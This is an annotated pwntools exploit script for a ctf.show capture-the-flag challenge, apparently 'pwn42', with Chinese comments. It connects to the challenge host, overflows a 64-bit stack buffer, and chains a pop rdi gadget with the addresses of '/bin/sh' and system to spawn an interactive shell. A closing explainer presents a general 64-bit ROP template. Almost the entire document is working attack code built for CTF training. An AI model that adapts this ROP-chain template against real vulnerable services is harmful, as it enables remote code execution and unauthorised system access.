from pwn import *

p = remote('pwn.challenge.ctf.show', 28132)

# offset = 0xA + 8：计算64位程序的栈溢出偏移量
# 0xA：缓冲区到saved rbp的距离（通过IDA或cyclic计算）
# 8：saved rbp的大小（64位程序，rbp为8字节）
# 总偏移量 = 0xA + 8 = 0x12，定位到返回地址
offset = 0xA + 8

# sys_addr = 0x4006B2：system函数的地址
# 通过IDA分析程序找到的system函数地址
sys_addr = 0x4006B2

# sh_addr = 0x400872：/bin/sh字符串的地址
# 通过IDA搜索字符串找到的"/bin/sh"地址
sh_addr = 0x400872

# pop_rdi = 0x400843：pop rdi; ret gadget的地址
# 用于将sh_addr加载到rdi寄存器（64位函数调用第一个参数通过rdi传递）
# 通过ROPgadget --binary=pwn42 grep "pop rdi; ret" 找到
pop_rdi = 0x400843

# payload构造分析：
# b'a' * offset：填充垃圾数据到返回地址位置
# p64(pop_rdi)：执行pop rdi; ret，将下一个值弹出到rdi寄存器
# p64(sh_addr)：被pop到rdi寄存器，作为system的第一个参数
# p64(sys_addr)：跳转到system函数执行
# 64位调用约定：system("/bin/sh") 中 "/bin/sh" 通过rdi传递
payload = b'a' * offset + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)

p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 64位system调用
2. 64位ROP链基础：
   - pop_rdi gadget：0x400843，用于给rdi寄存器赋值
   - rdi是第一个参数寄存器，system需要rdi指向"/bin/sh"
3. payload结构：
   b'a' * offset     - 填充到返回地址
   + p64(pop_rdi)    - 弹出sh_addr到rdi
   + p64(sh_addr)    - /bin/sh字符串地址
   + p64(sys_addr)   - system函数地址
4. 为什么不需要ret gadget？
   - 本题system地址0x4006B2可能是一个call指令地址
   - 或者程序本身没有严格的栈对齐检查
5. 64位ROP链通用模板：
   填充 + pop_rdi + arg1 + 函数地址
"""
